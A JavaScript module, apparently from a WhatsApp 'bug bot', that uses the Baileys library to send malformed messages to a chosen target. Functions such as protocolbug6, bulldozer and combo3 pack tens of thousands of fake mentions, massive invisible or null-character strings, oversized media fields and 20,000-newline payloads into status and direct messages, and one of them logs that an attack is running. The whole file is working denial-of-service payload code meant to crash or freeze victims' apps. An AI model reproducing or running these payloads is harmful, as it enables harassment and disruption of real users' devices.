import { generateWAMessageFromContent } from 'baileys';
import channelSender from './channelSender.js';

// Helper pour générer une liste de mentions aléatoires
function generateMentions(count) {
    const mentions = [];
    for (let i = 0; i < count; i++) {
        mentions.push(`${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`);
    }
    return mentions;
}

// ======================= ProtoXAudio =======================
export async function ProtoXAudio(target, mention, client) {
    console.log("Attack DelayProto Berjalan...");
    const mentionedJid = generateMentions(30000);
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0, 44, 165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245, 153, 93, 211]),
                    fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98, 117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212, 145]),
                    fileEncSha256: Buffer.from([29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84, 131, 54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211, 83, 153]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid,
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});
    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                { tag: "meta", attrs: { is_status_mention: "nika hahahaa" }, content: undefined }
            ]
        });
    }
}

// ======================= Bulldozer (Sticker) =======================
export async function bulldozer(isTarget, client) {
    const mentionedJid = generateMentions(40000);
    let message = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                    mimetype: "image/webp",
                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                    fileLength: { low: 1, high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: {
                        mentionedJid,
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                    },
                    stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false,
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(isTarget, message, {});
    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined },
                        ],
                    },
                ],
            },
        ],
    });
}

// ======================= protoXvid =======================
export async function protoXvid(isTarget, mention, client) {
    const mentionedList = generateMentions(40000);
    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "nika hahaha" + "ោ៝".repeat(10000),
        title: "⇞ nika hahaha ⇟",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "999999",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "nika hahaha",
        height: 999999,
        width: 999999,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363381288267213@newsletter",
            serverMessageId: 1,
            newsletterName: "⇞ 💫 nika hahaha ⇟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            { embeddedContent: { embeddedMusic }, embeddedAction: true }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, { viewOnceMessage: { message: { videoMessage } } }, {});
    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
            ]
        });
    }
}

// ======================= protocolbug6 =======================
export async function protocolbug6(target, mention, client) {
    const quotedMessage = {
        extendedTextMessage: {
            text: "᭯".repeat(12000),
            matchedText: "https://" + "ꦾ".repeat(500) + ".com",
            canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
            description: "\u0000".repeat(500),
            title: "\u200D".repeat(1000),
            previewType: "NONE",
            jpegThumbnail: Buffer.alloc(10000),
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: true,
                    title: "BoomXSuper",
                    body: "\u0000".repeat(10000),
                    thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
                },
                mentionedJid: generateMentions(1000)
            }
        },
        paymentInviteMessage: {
            currencyCodeIso4217: "USD",
            amount1000: "999999999",
            expiryTimestamp: "9999999999",
            inviteMessage: "Payment Invite" + "💥".repeat(1770),
            serviceType: 1
        }
    };
    const mentionedList = generateMentions(40000);
    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "ANGKASA" + "ោ៝".repeat(10000),
        title: "DEPAYY",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: "ANGKASA",
                body: "\u0000".repeat(9117),
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnailUrl: null,
                sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
            },
            businessMessageForwardInfo: { businessOwnerJid: target },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363331859075083@newsletter",
            serverMessageId: 1,
            newsletterName: "ꦾ".repeat(100)
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            { embeddedContent: { embeddedMusic }, embeddedAction: true }
        ]
    };

    const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
            ]
        });
    }
}

// ======================= protocolbug7 =======================
export async function protocolbug7(isTarget, mention, client) {
    const floods = 40000;
    const mentioning = "13135550002@s.whatsapp.net";
    const mentionedJids = [mentioning, ...generateMentions(floods)];
    const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
    const mime = "audio/mpeg";
    const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
    const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
    const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
    const timestamp = 99999999999999;
    const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
    const longs = 99999999999999;
    const loaded = 99999999999999;
    const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

    const messageContext = {
        mentionedJid: mentionedJids,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "💫 ANGKASA"
        }
    };

    const messageContent = {
        ephemeralMessage: {
            message: {
                audioMessage: {
                    url: links,
                    mimetype: mime,
                    fileSha256: sha,
                    fileLength: longs,
                    seconds: loaded,
                    ptt: true,
                    mediaKey: key,
                    fileEncSha256: enc,
                    directPath: path,
                    mediaKeyTimestamp: timestamp,
                    contextInfo: messageContext,
                    waveform: data
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });
    const broadcastSend = {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    };
    await client.relayMessage("status@broadcast", msg.message, broadcastSend);

    if (mention) {
        await client.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                { tag: "meta", attrs: { is_status_mention: " null - exexute " }, content: undefined }
            ]
        });
    }
}

// ======================= protocolbug5 =======================
export async function protocolbug5(isTarget, mention, client) {
    const mentionedList = generateMentions(40000);
    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".ANGKASA" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: Buffer.from("c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=", "base64"),
        fileLength: "289511",
        seconds: 15,
        mediaKey: Buffer.from("IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=", "base64"),
        caption: "💫 ANGKASA",
        height: 640,
        width: 640,
        fileEncSha256: Buffer.from("BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=", "base64"),
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿💫 ANGKASA⃟"
        },
        streamingSidecar: Buffer.from("cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=", "base64"),
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: Buffer.from("QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=", "base64"),
        thumbnailEncSha256: Buffer.from("fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=", "base64"),
        annotations: [
            { embeddedContent: { embeddedMusic }, embeddedAction: true }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, { viewOnceMessage: { message: { videoMessage } } }, {});
    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
            ]
        });
    }
}

// ======================= combo3 =======================
export async function combo3(target, client) {
    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: { text: '' },
                    footer: { text: '' },
                    carouselMessage: {
                        cards: [
                            {
                                header: {
                                    title: '𝗡𝗜𝗞𝗔☀',
                                    imageMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                                        mimetype: "image/jpeg",
                                        fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                                        fileLength: "164089",
                                        height: 1,
                                        width: 1,
                                        mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                                        fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                                        directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                                        mediaKeyTimestamp: "1749172037",
                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                                        scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                                        scanLengths: [8596, 155493]
                                    },
                                    hasMediaAttachment: true,
                                },
                                body: { text: "𝗡𝗜𝗞𝗔☀" },
                                footer: { text: "nika.json" },
                                nativeFlowMessage: { messageParamsJson: "\n".repeat(20000) }
                            }
                        ]
                    },
                    contextInfo: {
                        participant: "0@s.whatsapp.net",
                        quotedMessage: {
                            viewOnceMessage: {
                                message: {
                                    interactiveResponseMessage: {
                                        body: { text: "Sent", format: "DEFAULT" },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: "{ nika.json }",
                                            version: 3
                                        }
                                    }
                                }
                            }
                        },
                        remoteJid: "@s.whatsapp.net"
                    }
                }
            }
        }
    }, {});

    await client.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });
}

// ======================= combo2 =======================
export async function combo2(target, client) {
    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: { text: '' },
                    footer: { text: '' },
                    carouselMessage: {
                        cards: [
                            {
                                header: {
                                    title: '𝗡𝗜𝗞𝗔☀',
                                    imageMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                                        mimetype: "image/jpeg",
                                        fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                                        fileLength: "164089",
                                        height: 1,
                                        width: 1,
                                        mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                                        fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                                        directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                                        mediaKeyTimestamp: "1749172037",
                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                                        scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                                        scanLengths: [8596, 155493]
                                    },
                                    hasMediaAttachment: true,
                                },
                                body: { text: "𝗡𝗜𝗞𝗔☀" },
                                footer: { text: "nika.json" },
                                nativeFlowMessage: { messageParamsJson: "\n".repeat(20000) }
                            }
                        ]
                    },
                    contextInfo: {
                        participant: "0@s.whatsapp.net",
                        quotedMessage: {
                            viewOnceMessage: {
                                message: {
                                    interactiveResponseMessage: {
                                        body: { text: "Sent", format: "DEFAULT" },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: "{ phynx.json }",
                                            version: 3
                                        }
                                    }
                                }
                            }
                        },
                        remoteJid: "@s.whatsapp.net"
                    }
                }
            }
        }
    }, {});

    await client.relayMessage("status@broadcast", msg, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });
}

// ======================= bulldozerV2 =======================
export async function bulldozerV2(target, client) {
    const stickerPayload = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
            fileLength: { low: 99999999, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 50000,
            firstFrameSidecar: "QmFkUmVhZHlUT1JFQ1Q=",
            isAnimated: true,
            isAvatar: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: generateMentions(60000),
                forwardingScore: 999999,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: true,
                    title: "\u200E".repeat(40000),
                    body: "\u200E".repeat(40000),
                    mediaUrl: "",
                    mediaType: 1,
                    thumbnail: Buffer.from([]),
                    sourceUrl: "",
                    renderLargerThumbnail: true
                }
            }
        }
    };

    const templatePayload = {
        templateMessage: {
            hydratedTemplate: {
                hydratedContentText: "\u200E".repeat(90000),
                hydratedFooterText: "Oblivion Force Activated",
                hydratedButtons: [],
                templateId: "oblivion_" + Date.now(),
                contextInfo: {
                    quotedMessage: stickerPayload,
                    forwardingScore: 88888,
                    isForwarded: true
                }
            }
        }
    };

    const wrap = { viewOnceMessage: { message: templatePayload } };
    const msg = generateWAMessageFromContent(target, wrap, { quoted: null, messageId: "oblv_" + Date.now() });
    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });
}

